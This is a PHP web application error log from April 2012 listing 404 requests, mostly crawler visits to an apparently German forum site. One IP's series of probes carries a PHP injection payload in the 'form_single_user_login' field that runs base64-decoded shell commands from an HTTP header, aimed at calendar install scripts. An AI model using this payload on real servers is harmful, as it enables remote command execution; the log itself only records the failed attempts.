2012-04-25T01:42:40+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 66.249.66.5
HTTP_REFERER: 
requested: array(8) {
  ["controller"] => string(5) "forum"
  ["action"] => string(13) "viewtopic.php"
  ["module"] => string(7) "default"
  ["t"] => string(2) "13"
  ["start"] => string(1) "0"
  ["postdays"] => string(1) "0"
  ["postorder"] => string(3) "asc"
  ["highlight"] => string(0) ""
}


--------------------------------------------------------------------------------
2012-04-25T09:41:19+00:00 ERR (3) 404 "" was not found.
REMOTE_ADDR: 157.56.95.138
HTTP_REFERER: 
requested: array(5) {
  ["lang"] => string(2) "en"
  ["action"] => string(7) "archive"
  ["module"] => string(7) "default"
  ["controller"] => string(5) "index"
  ["key"] => string(0) ""
}


--------------------------------------------------------------------------------
2012-04-25T11:51:57+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(6) {
  ["controller"] => string(7) "install"
  ["action"] => string(9) "index.php"
  ["module"] => string(7) "default"
  ["app_settings"] => string(1) "1"
  ["form_user_inc"] => string(8) "user.php"
  ["form_single_user_login"] => string(62) "*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;"
}


--------------------------------------------------------------------------------
2012-04-25T11:51:57+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(8) "includes"
  ["action"] => string(12) "settings.php"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2012-04-25T11:51:58+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(6) {
  ["controller"] => string(8) "calendar"
  ["action"] => string(7) "install"
  ["module"] => string(7) "default"
  ["app_settings"] => string(1) "1"
  ["form_user_inc"] => string(8) "user.php"
  ["form_single_user_login"] => string(62) "*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;"
}


--------------------------------------------------------------------------------
2012-04-25T11:51:58+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(8) "calendar"
  ["action"] => string(8) "includes"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2012-04-25T11:51:59+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(6) {
  ["controller"] => string(11) "webcalendar"
  ["action"] => string(7) "install"
  ["module"] => string(7) "default"
  ["app_settings"] => string(1) "1"
  ["form_user_inc"] => string(8) "user.php"
  ["form_single_user_login"] => string(62) "*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;"
}


--------------------------------------------------------------------------------
2012-04-25T11:51:59+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(11) "webcalendar"
  ["action"] => string(8) "includes"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2012-04-25T11:52:00+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(7) {
  ["controller"] => string(7) "catalog"
  ["action"] => string(8) "calendar"
  ["install"] => string(9) "index.php"
  ["module"] => string(7) "default"
  ["app_settings"] => string(1) "1"
  ["form_user_inc"] => string(8) "user.php"
  ["form_single_user_login"] => string(62) "*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;"
}


--------------------------------------------------------------------------------
2012-04-25T11:52:00+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(4) {
  ["controller"] => string(7) "catalog"
  ["action"] => string(8) "calendar"
  ["includes"] => string(12) "settings.php"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2012-04-25T11:52:01+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(6) {
  ["controller"] => string(3) "cal"
  ["action"] => string(7) "install"
  ["module"] => string(7) "default"
  ["app_settings"] => string(1) "1"
  ["form_user_inc"] => string(8) "user.php"
  ["form_single_user_login"] => string(62) "*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;"
}


--------------------------------------------------------------------------------
2012-04-25T11:52:01+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(3) "cal"
  ["action"] => string(8) "includes"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2012-04-25T11:52:02+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(6) {
  ["controller"] => string(6) "webcal"
  ["action"] => string(7) "install"
  ["module"] => string(7) "default"
  ["app_settings"] => string(1) "1"
  ["form_user_inc"] => string(8) "user.php"
  ["form_single_user_login"] => string(62) "*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;"
}


--------------------------------------------------------------------------------
2012-04-25T11:52:03+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 209.190.19.50
HTTP_REFERER: 
requested: array(3) {
  ["controller"] => string(6) "webcal"
  ["action"] => string(8) "includes"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
2012-04-25T14:36:42+00:00 ERR (3) 404 Seite nicht gefunden
REMOTE_ADDR: 109.167.128.226
HTTP_REFERER: http://graphicore.de/forum/
requested: array(3) {
  ["controller"] => string(5) "forum"
  ["action"] => string(5) "index"
  ["module"] => string(7) "default"
}


--------------------------------------------------------------------------------
